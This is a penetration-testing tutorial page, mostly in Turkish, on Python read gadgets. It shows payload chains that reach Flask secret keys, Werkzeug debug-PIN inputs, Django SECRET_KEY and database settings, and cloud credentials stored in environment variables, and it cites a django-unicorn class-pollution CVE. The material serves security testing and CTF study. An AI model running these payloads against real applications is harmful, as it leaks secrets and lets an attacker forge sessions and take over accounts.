# Python İç Okuma Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

Farklı zafiyetler, örneğin [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) veya [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), **Python'un dahili verilerini okumanıza izin verebilir ancak kod çalıştırmanıza izin vermez**. Bu nedenle bir pentester, bu okuma izinlerinden en iyi şekilde yararlanarak **hassas ayrıcalıkları elde etmeli ve zafiyeti yükseltmelidir**.

### Flask - Gizli anahtarı okuma

Bir Flask uygulamasının ana sayfasında muhtemelen **`app`** global objesi bulunur; burası **bu gizli anahtarın yapılandırıldığı** yerdir.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Bu durumda, bu nesneye, [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html) sayfasındaki herhangi bir gadget kullanılarak **global nesnelere erişmek** mümkündür.

Eğer **the vulnerability is in a different python file**, ana dosyaya ulaşmak için dosyalar arasında gezinen bir gadget'a ihtiyacınız olur; böylece Flask secret key'i değiştirmek için **global nesne `app.secret_key`'e erişebilir** ve [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Böyle bir payload [from this writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Use this payload to **change `app.secret_key`** (the name in your app might be different) to be able to sign new and more privileges flask cookies.

### Werkzeug - machine_id and node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) ile **machine_id** ve **uuid** node'una erişebileceksiniz; bunlar, [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) oluşturmak için gereken **ana gizli bilgiler**dir. Bu pin'i, **debug mode** etkinse `/console` üzerindeki python console'a erişmek için kullanabilirsiniz:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Sunucunun **`app.py`'ye ait yerel yolunu** web sayfasında oluşacak bir **hata** tetikleyerek alabileceğinizi unutmayın; bu hata size **yolu verir**.

If the vulnerability is in a different python file, check the previous Flask trick to access the objects from the main python file.

### Django - SECRET_KEY and settings module

Django settings nesnesi uygulama başladığında `sys.modules` içinde önbelleğe alınır. Sadece read primitives ile **`SECRET_KEY`**, veritabanı kimlik bilgileri veya imzalama saltlarını leak edebilirsiniz:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
```
Eğer zafiyetli gadget başka bir module içindeyse, önce globals üzerinde gezinin:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
Anahtar bilindiğinde, Flask'le benzer şekilde Django signed cookies veya tokens forge edebilirsiniz.

### Ortam değişkenleri / cloud creds yüklenmiş modüller aracılığıyla

Birçok jail hâlâ bir yerde `os` veya `sys` import ediyor. Ulaşılabilir herhangi bir fonksiyonun `__init__.__globals__`'ünü kötüye kullanarak, önceden import edilmiş `os` modülüne pivot yapabilir ve API tokens, cloud keys veya flags içeren **ortam değişkenlerini** dump edebilirsiniz:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Eğer alt sınıf indeksi filtrelenmişse, loaders kullanın:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Ortam değişkenleri genellikle okuma erişiminden tam ele geçirmeye geçmek için ihtiyaç duyulan tek gizli bilgilerdir (cloud IAM keys, database URLs, signing keys, etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` (<0.62.0) crafted component istekleri yoluyla **class pollution**'a izin veriyordu. `__init__.__globals__` gibi bir property path ayarlamak, saldırganın component modülünün globals'larına ve import edilmiş modüllere (örn. `settings`, `os`, `sys`) ulaşmasını sağlıyordu. Buradan kod yürütmesi olmadan `SECRET_KEY`, `DATABASES` veya servis kimlik bilgilerini leak edebilirsiniz. Exploit zinciri tamamen okuma-tabanlıdır ve yukarıdakiyle aynı dunder-gadget pattern'lerini kullanır.

### Gadget collections for chaining

Son CTF'ler (ör. jailCTF 2025) yalnızca attribute erişimi ve subclass enumeration ile inşa edilmiş güvenilir okuma zincirleri gösteriyor. Topluluk tarafından bakım yapılan listeler, örneğin [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), nesnelerden `__globals__`, `sys.modules` ve nihayet hassas verilere ulaşmak için birleştirilebilecek yüzlerce minimal gadgets kataloglar. Python minör sürümleri arasında indeksler veya sınıf isimleri farklı olduğunda hızlıca uyum sağlamak için bunları kullanın.

## Referanslar

- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
